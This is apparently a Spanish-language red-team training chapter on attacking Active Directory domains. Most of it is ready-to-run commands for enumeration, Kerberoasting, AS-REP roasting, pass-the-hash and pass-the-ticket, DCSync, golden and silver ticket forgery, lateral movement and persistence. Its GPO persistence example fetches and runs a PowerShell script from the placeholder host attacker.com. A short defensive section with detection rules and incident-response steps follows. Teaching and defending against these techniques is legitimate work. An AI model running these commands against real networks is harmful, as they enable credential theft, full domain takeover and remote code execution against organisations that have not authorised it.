---
title: "14 — Active Directory Hacking"
description: "14 — Active Directory Hacking"
---

# 14 — Active Directory Hacking

> 🎯 **Objetivo:** dominar los ataques a Active Directory que usan los Red Teams profesionales: enumeración, explotación de Kerberos, movimiento lateral y persistencia en dominios AD.

## 1. Fundamentos de Active Directory

### 1.1 ¿Qué es Active Directory?

Active Directory (AD) es el servicio de directorio de Microsoft que gestiona usuarios, computadoras, políticas de seguridad y recursos en una red corporativa.

```
┌─────────────────────────────────────────────────────────┐
│               ARQUITECTURA ACTIVE DIRECTORY             │
├─────────────────────────────────────────────────────────┤
│                                                         │
│   [Domain Controller]                                   │
│   ├── NTDS.dit (base de datos de usuarios)              │
│   ├── SYSVOL (políticas de grupo)                       │
│   ├── LDAP (protocolo de consulta)                      │
│   ├── Kerberos (autenticación)                          │
│   └── DNS (resolución de nombres)                       │
│                                                         │
│   [Organizational Units]                                │
│   ├── OU=Users                                          │
│   ├── OU=Computers                                      │
│   ├── OU=Servers                                        │
│   └── OU=Groups                                         │
│                                                         │
│   [Trust Relationships]                                 │
│   ├── Intra-forest trusts                               │
│   ├── External trusts                                   │
│   └── Forest trusts                                     │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 1.2 Componentes Clave

| Componente | Función |
|------------|---------|
| **Domain Controller (DC)** | Servidor que almacena y replica la base de datos AD |
| **NTDS.dit** | Archivo que contiene todas las credenciales de usuarios |
| **Kerberos** | Protocolo de autenticación principal |
| **LDAP** | Protocolo para consultar el directorio |
| **GPO** | Políticas de grupo que controlan configuraciones |
| **DNS** | Resolución de nombres en el dominio |
| **Trust** | Relaciones entre dominios/forests |

### 1.3 Credenciales y Hashes

```
┌─────────────────────────────────────────────────────────┐
│                 TIPOS DE HASHES EN AD                   │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  NTLM Hash:                                             │
│  Admin:500:aad3b435b51404eeaad3b435b51404ee:           │
│         da76f2b281b4e0e26e83b2ac5b9e29e1:::            │
│       ^^^ID  ^^^LM hash        ^^^NT hash              │
│                                                         │
│  Kerberos Ticket (TGT/TGS):                            │
│  - TGT: Ticket Granting Ticket (acceso general)         │
│  - TGS: Service Ticket (acceso a servicios)             │
│                                                         │
│  Kerberoastable:                                        │
│  - Service accounts con SPN                             │
│  - Hash crackeable offline                              │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

## 2. Enumeración de Active Directory

### 2.1 Herramientas de Enumeración

```bash
# === BLOODHOUND ===
# Recopilar datos para análisis visual de rutas de ataque
bloodhound-python -u user -p password -d corp.local -ns 10.0.2.10 -c All

# Importar en BloodHound GUI
# Cargar archivos JSON en la base de datos

# === ENUMERACIÓN CON LDAP ===
# Usando ldapsearch
ldapsearch -x -H ldap://10.0.2.10 -D "user@corp.local" -w password -b "DC=corp,DC=local"

# Enumerar usuarios
ldapsearch -x -H ldap://10.0.2.10 -D "user@corp.local" -w password -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Enumerar grupos
ldapsearch -x -H ldap://10.0.2.10 -D "user@corp.local" -w password -b "DC=corp,DC=local" "(objectClass=group)" cn

# Enumerar computadoras
ldapsearch -x -H ldap://10.0.2.10 -D "user@corp.local" -w password -b "DC=corp,DC=local" "(objectClass=computer)" cn

# === ENUMERACIÓN CON CRACKMAPEXEC ===
# SMB enumeration
crackmapexec smb 10.0.2.0/24 -u user -p password --users
crackmapexec smb 10.0.2.0/24 -u user -p password --groups
crackmapexec smb 10.0.2.0/24 -u user -p password --shares

# LDAP enumeration
crackmapexec ldap 10.0.2.10 -u user -p password --users
crackmapexec ldap 10.0.2.10 -u user -p password --groups

# === ENUMERACIÓN CON IMPACKET ===
# LDAP enumeration
impacket-ldapsearch corp.local/user:password@10.0.2.10

# SPN enumeration
impacket-GetUserSPNs corp.local/user:password -dc-ip 10.0.2.10 -request
```

### 2.2 BloodHound - Rutas de Ataque

```bash
# 1. Recopilar datos
bloodhound-python -u user -p password -d corp.local -ns 10.0.2.10 -c All

# 2. Importar en GUI
# Abrir BloodHound
# Importar archivos JSON

# 3. Analizar rutas de ataque
# - Ruta más corta a Domain Admin
# - Usuarios con delegación
# - Grupos privilegiados
# - Trusts entre dominios

# 4. Identificar vectores
# - Kerberoasting
# - AS-REP Roasting
# - Delegation abuse
# - GPO abuse
```

### 2.3 Enumeración de Service Accounts

```bash
# Buscar Service Principal Names (SPNs)
impacket-GetUserSPNs corp.local/user:password -dc-ip 10.0.2.10 -request

# CrackMapExec
crackmapexec ldap 10.0.2.10 -u user -p password --spns

# Identificar cuentas de servicio
ldapsearch -x -H ldap://10.0.2.10 -D "user@corp.local" -w password -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

## 3. Ataques a Kerberos

### 3.1 Kerberoasting

```bash
# Kerberoasting - crackear TGS de service accounts
# Requiere: usuario válido + SPN configurado

# 1. Obtener TGS
impacket-GetUserSPNs corp.local/user:password -dc-ip 10.0.2.10 -request

# 2. Guardar hash
# Output: $krb5tgs$23$*user$CORP.LOCAL$...hash...

# 3. Crackear con hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# 4. Alternativa con Rubeus
# En Windows
Rubeus.exe kerberoast /outfile:hashes.txt
```

### 3.2 AS-REP Roasting

```bash
# AS-REP Roasting - atacar cuentas sin Kerberos preauth
# Requiere: usuario con "Do not require Kerberos preauthentication"

# 1. Enumerar cuentas vulnerables
impacket-GetNPUsers corp.local/ -dc-ip 10.0.2.10 -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# 2. Crackear hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# 3. Alternativa con Rubeus
Rubeus.exe asreproast /outfile:asrep_hashes.txt
```

### 3.3 Pass the Ticket

```bash
# Pass the Ticket - usar TGT/TGS robado
# Requiere: ticket robado (TGT o TGS)

# 1. Extraer tickets con Mimikatz
mimikatz # sekurlsa::tickets /export

# 2. Usar ticket con Impacket
export KRB5CCNAME=user.ccache
impacket-psexec corp.local/user@dc01.local -k -no-pass

# 3. Alternativa con Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
```

### 3.4 Pass the Hash

```bash
# Pass the Hash - usar NTLM hash sin contraseña
# Requiere: NTLM hash de usuario

# 1. Extraer hash con Mimikatz
mimikatz # sekurlsa::msv

# 2. Usar hash con Impacket
impacket-psexec corp.local/user@10.0.2.10 -hashes aad3b435b51404eeaad3b435b51404ee:da76f2b281b4e0e26e83b2ac5b9e29e1

# 3. Usar con CrackMapExec
crackmapexec smb 10.0.2.10 -u user -H da76f2b281b4e0e26e83b2ac5b9e29e1 --local-auth
```

## 4. Explotación de Active Directory

### 4.1 DCSync

```bash
# DCSync - simular replicación de dominio
# Requiere: privilegios de Domain Admin o equivalente

# 1. Extraer hashes con Mimikatz
mimikatz # lsadump::dcsync /user:krbtgt
mimikatz # lsadump::dcsync /all /csv

# 2. Extraer con Impacket
impacket-secretsdump corp.local/admin:password@10.0.2.10

# 3. Obtener hash de krbtgt
# Hash de krbgtgt permite crear Golden Ticket
```

### 4.2 Golden Ticket

```bash
# Golden Ticket - TGT falsificado con hash de krbgtgt
# Requiere: hash de krbgtgt + SID del dominio

# 1. Obtener hash de krbgtgt
mimikatz # lsadump::dcsync /user:krbtgt

# 2. Obtener SID del dominio
whoami /all
# O con Mimikatz
mimikatz # lsadump::dcsync /user:krbtgt

# 3. Crear Golden Ticket
mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:da76f2b281b4e0e26e83b2ac5b9e29e1 /ticket:golden.kirbi

# 4. Usar ticket
mimikatz # kerberos::ptt golden.kirbi
mimikatz # psexec \\dc01.local cmd.exe
```

### 4.3 Silver Ticket

```bash
# Silver Ticket - TGS falsificado para servicio específico
# Requiere: hash de service account

# 1. Obtener hash de service account
mimikatz # sekurlsa::msv

# 2. Crear Silver Ticket
mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /target:web01.local /service:http /rc4:hash /ticket:silver.kirbi

# 3. Usar ticket
mimikatz # kerberos::ptt silver.kirbi
```

### 4.4 Delegation Attacks

```bash
# Unconstrained Delegation
# El DC guarda TGT de usuarios que se conectan
# Ataque: robar TGT del DC

# Constrained Delegation
# Service account puede impersonar usuarios
# Ataque: S4U2Self/S4U2Proxy

# Resource-Based Constrained Delegation (RBCD)
# Ataque: configurar msDS-AllowedToActOnBehalfOfOtherIdentity

# Herramientas
impacket-getST corp.local/user:password -impersonate admin -dc-ip 10.0.2.10 web01.local
```

## 5. Movimiento Lateral en AD

### 5.1 Técnicas de Movimiento Lateral

```bash
# === PSExec ===
impacket-psexec corp.local/admin:password@10.0.2.10
psexec.py corp.local/admin:password@10.0.2.10

# === WMIExec ===
impacket-wmiexec corp.local/admin:password@10.0.2.10

# === WinRM (Evil-WinRM) ===
evil-winrm -i 10.0.2.10 -u admin -p password

# === SMBExec ===
impacket-smbexec corp.local/admin:password@10.0.2.10

# === DCOM ===
impacket-dcomexec corp.local/admin:password@10.0.2.10

# === RDP ===
xfreerdp /v:10.0.2.10 /u:admin /p:password
```

### 5.2 Herramientas de Movimiento Lateral

| Herramienta | Método | Ventaja |
|-------------|--------|---------|
| **Impacket** | PsExec, WMIExec, SMBExec | Multiplatform, rápido |
| **CrackMapExec** | SMB, WinRM, LDAP | Autenticación masiva |
| **Evil-WinRM** | WinRM | Shell interactiva |
| **Cobalt Strike** | Múltiples | Integrado con C2 |
| **Rubeus** | Kerberos | Tickets y delegación |

## 6. Persistencia en Active Directory

### 6.1 Métodos de Persistencia

```bash
# === GOLDEN TICKET ===
# Persistencia con hash de krbgtgt
# Sobrevive cambio de contraseñas de usuarios

# === DCSync BACKDOOR ===
# Crear usuario con privilegios de replicación
# Agregar a grupo "Replicating Directory Changes"

# === SKELETON KEY ===
# Modificar LSASS para aceptar contraseña maestra
# Muy detectable, solo para laboratorios

# === ADMINSDHOLDER ===
# Proteger objeto con AdminSDHolder
# Sobrevive cambios de ACL

# === GPO PERSISTENCE ===
# Modificar GPO para ejecutar código
# Se ejecuta en todas las máquinas del dominio

# === DCShadow ===
# Simular temporalmente un DC
# Modificar atributos sin ser detectado
```

### 6.2 Ejemplo: GPO Persistence

```bash
# 1. Crear GPO maliciosa
# Usar SharpGPOAbuse
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

# 2. Aplicar GPO a OU específica
# Usar GroupPolicyObject PowerShell module

# 3. Verificar
# La GPO se ejecutará en todas las máquinas de la OU
```

## 7. Defensa contra Ataques AD

### 7.1 Controles Preventivos

```bash
# === HARDENING DE KERBEROS ===
# Usar contraseñas fuertes para service accounts (30+ caracteres)
# Habilitar AES en Kerberos (no RC4)
# Configurar privilegios mínimos

# === MONITORIZACIÓN ===
# Detectar Kerberoasting (Event ID 4769)
# Detectar DCSync (Event ID 4662)
# Detectar Golden Ticket (Event ID 4768, 4769)

# === SEGURIDAD DE CONTRASEÑAS ===
# Implementar LAPS (Local Admin Password Solution)
# Usar contraseñas rotativas para service accounts
# Habilitar MFA para cuentas privilegiadas
```

### 7.2 Detección con Sigma Rules

```yaml
# Kerberoasting Detection
title: Kerberoasting Activity
id: 12345678-1234-1234-1234-123456789012
status: experimental
logsource:
    category: authentication
    product: windows
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
        TicketOptions: '0x40810000'
    filter:
        ServiceName: 'krbtgt'
    condition: selection and not filter
level: medium
tags:
    - attack.credential_access
    - attack.t1558
```

### 7.3 Respuesta a Incidentes

```bash
# === SI SE DETECTA KERBEROASTING ===
# 1. Identificar service account comprometida
# 2. Cambiar contraseña inmediatamente
# 3. Revisar logs de autenticación
# 4. Buscar movimiento lateral

# === SI SE DETECTA DCSYNC ===
# 1. Aislar DC afectado
# 2. Cambiar contraseña de krbtgt (2 veces)
# 3. Replicar cambios a todos los DCs
# 4. Buscar Golden Tickets activos

# === SI SE DETECTA GOLDEN TICKET ===
# 1. Cambiar contraseña de krbtgt (2 veces)
# 2. Replicar cambios
# 3. Buscar artefactos en endpoints
# 4. Monitorear autenticaciones sospechosas
```

## 8. Ejercicios Prácticos

### Ejercicio 1: Enumeración de AD

```bash
# 1. Conectar al dominio
crackmapexec smb 10.0.2.0/24 -u user -p password

# 2. Enumerar usuarios
crackmapexec ldap 10.0.2.10 -u user -p password --users

# 3. Enumerar grupos
crackmapexec ldap 10.0.2.10 -u user -p password --groups

# 4. Enumerar SPNs
impacket-GetUserSPNs corp.local/user:password -dc-ip 10.0.2.10 -request

# 5. Documentar hallazgos
echo "Usuarios enumerados: $(wc -l < users.txt)"
echo "Service accounts: $(grep -c 'SPN' spn_list.txt)"
```

### Ejercicio 2: Kerberoasting

```bash
# 1. Obtener TGS
impacket-GetUserSPNs corp.local/user:password -dc-ip 10.0.2.10 -request -outputfile kerberoast_hashes.txt

# 2. Crackear hash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# 3. Obtener contraseña
# Service account: sql_svc / Password123!

# 4. Usar credenciales
crackmapexec smb 10.0.2.0/24 -u sql_svc -p Password123!
```

### Ejercicio 3: DCSync y Golden Ticket

```bash
# 1. Obtener hash de krbtgt
impacket-secretsdump corp.local/admin:password@10.0.2.10 -just-dc-user krbtgt

# 2. Obtener SID del dominio
# Usar crackmapexec o bloodhound

# 3. Crear Golden Ticket
mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi

# 4. Usar ticket
mimikatz # kerberos::ptt golden.kirbi
mimikatz # psexec \\dc01.local cmd.exe

# 5. Verificar acceso
whoami
```

### Ejercicio 4: Movimiento Lateral

```bash
# 1. Desde usuario comprometido a Domain Admin
# Paso 1: Kerberoasting
# Paso 2: Crackear hash
# Paso 3: Usar service account para DCSync
# Paso 4: Crear Golden Ticket
# Paso 5: Moverse a otros servidores

# Documentar cada paso
echo "Paso 1: Kerberoasting → hash de sql_svc"
echo "Paso 2: Crackear → Password123!"
echo "Paso 3: DCSync → hash de krbtgt"
echo "Paso 4: Golden Ticket → Domain Admin"
echo "Paso 5: Acceso a web01, file01, db01"
```

## 9. Referencias y Recursos

| Recurso | Descripción |
|---------|-------------|
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | Mapeo de rutas de ataque |
| [Impacket](https://github.com/fortra/impacket) | Herramientas de red/AD |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Kerberos attacks |
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Extracción de credenciales |
| [CrackMapExec](https://github.com/Penntest-docker/CrackMapExec) | Autenticación masiva |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | Shell WinRM |
| [ADSecurity](https://adsecurity.org/) | Blog de seguridad AD |
| [HarmJ0y Blog](https://blog.harmj0y.net/) | Investigación AD |

## 📌 Checkpoint final

Antes de avanzar, verifica que puedas:

- [ ] Enumerar Active Directory con BloodHound y CrackMapExec
- [ ] Ejecutar Kerberoasting y crackear hashes
- [ ] Crear Golden Ticket con hash de krbtgt
- [ ] Realizar DCSync para extraer hashes
- [ ] Movimiento lateral con múltiples técnicas
- [ ] Implementar persistencia en AD
- [ ] Entender defensas y detección

> ⏭️ **Siguiente:** [`06-forense-digital.md`](./06-forense-digital.md) — Cómo investigar y analizar incidentes.
